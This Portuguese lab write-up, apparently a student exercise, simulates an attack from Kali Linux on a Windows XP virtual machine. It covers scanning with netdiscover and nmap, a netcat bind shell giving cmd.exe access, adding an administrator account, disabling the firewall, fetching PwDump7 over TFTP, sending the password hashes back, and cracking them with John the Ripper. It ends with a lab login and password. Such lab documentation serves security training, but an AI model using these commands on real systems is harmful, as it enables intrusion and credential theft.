# Simulando um ataque com Kali no Linux

Com as máquinas devidamente criadas e configuradas.
Iniciou-se testes para verificar conectividade.

Após configurar rede NatNetwork para ambas as máquinas
Ping entre as máquinas se estabeleceu bem.

Porém houve alteração do IP do Windowns XP para IP fixo (10.0.2.21).


```
Ip –br a // permite ver as interfaces com os ip atribuídos
```



Executando:
```
Sudo Netdiscover 
```

De início não consta nada, porém ao realizar pings com o XP no Kali, ele identifica o IP do XP
 

Como constou no netdiscover o IP do XP utilizou-se:
```
 Nmap -A 10.10.2.0/24
```

Ao executar nmap -A além das portas, também mostrou o sistema operacional, o horário do sistema, level de autenticação, e já identificou name computer e BIOS, assim como Workgroup.

Já a sintaxe nmap -sS nos forneceu apenas as informações das portas, inclusive a porta 1010/tcp que abrimos (nc -L -p 1010 -e cmd.exe) no XP para explorá-la.
 

Executando nc 10.0.2.21 1010, no Kali. Já temos acesso ao XP.
Com acesso, executaremos ``` C:\ qwinsta ``` - Foi verificado utilizador logado, no meu caso Admin1.
Rodamos ```C:\ net user Admin9 /add ``` para criar um usuário, Admin9, e logo depois deletado com, ```C:\ net user Admin9 /delete```, e depois criado um Admin11 como mostra imagem a seguir.
 

Ainda utilizando o net user, foi criado um usuário “pirata” e depois adicionado senha ao seu perfil.
Com os comandos ```net user pirata /add``` e depois ```net user pirata 111```
 
Caso necessário podemos remover a senha com o comando ```net user pirata *```
Ao utilizar ```C:\ net localgroup administradores pirata /add``` 


















C:\ shutdown –s –t 55 ➔ agenda um encerramento ao fim de 55 segundos 
C:\shutdown –a ➔ para o encerramento agendado 
C:\ipconfig /all ➔ ver as configurações IP 
C:\route print ➔ ver rotas/ tabela de roteamento 
 
C:\arp –a ➔ permite ver a informação a cerca do gateway 
C:\netsh firewall show state ➔ ver o estado da firewall 
C:\netsh firewall show config ➔ verificar as configurações da firewall 
C:\systeminfo ➔ permite ver à quanto tempo a maquina não é desligada 
C:\netsh firewall set opmode disable ➔colocar a firewall como desativada 
C:\netsh firewall set opmode enable ➔ colocar a firewall como ativada
 


Capturando a password dos users e fazendo crap das password do user.
Através do aplicativo “pwdump”, descarregamos para o kali, este vai ser usado para ser enviado para a máquina xp, para obtermos as senhas. 
Foi criado no kali uma pasta pwdump para descarregar o conteúdo, utilizamos unzip pwdump7.zip para extrair os arquivos dentro da pasta
vamos fazer uso do tftp para isso é necessário proceder à intalação dos serviços de tftp.
(tftp é um recurso para envio de arquivos entre as máquinas)
Executado sudo apt-get install tftpd-hpa tftp-server -y ou sudo apt-get install tftpd-hpa e 
sudo apt-get install tftpd-server –y
 
Fazer a configuração do serviço tftp com o comando: sudo nano /etc/default/tftpd-hpa–l
A linha que tem a linha que tem TFTP_OPTIONS=" --secure” tem de ser alterada para
TFTP_OPTIONS="--secure --create"



Copiar os ficheiros do pwdump no KALI para:  /srv/tftp
sudo cp pwdump7.exe /srv/tftp
sudo cp libeay32.dll /srv/tftp

Na máquina XP criar uma pasta na raiz com nome ataque 
Agora através do KALI executar os comandos no XP dentro da pasta de ataque 
tftp -i 10.0.2.15 get libeay32.dll
tftp -i 10.0.2.15 get PwDump7.exe (case sensitive)

Com isso, conseguimos transferir os dois arquivos do KALI para o XP e agora podemos executar o PwDump7 
 

Executando PwDump7.exe > contas.txt 
O arquivo contas.txt fica com o conteúdo das passwords encriptadas. 
Agora transferimos o arquivo contas.txt para o KALI, com o comando: Tftp -i 10.0.2.15 put contas.txt
Obtivemos um erro de permissão, permission denied, no KALI, para resolver, utilizamos: /srv , depois, ls -i e então, sudo chmod -R 777 tftp 
Ao tentar novamente, já obtivemos sucesso na transferência do arquivo. 
  
Dentro da pasta /srv/tftp já podemos abrir o arquivo e ver o arquivo com password encriptado
Utilizamos sudo john contas.txt e já conseguimos ver os longin e passwords cadastrados no w XP.
 
E utilizando sudo john conta.txt --wordlist=/diretorioondeandaofile_rockyou.txt
 



Login KALI: sks	 	/	senha: kali123
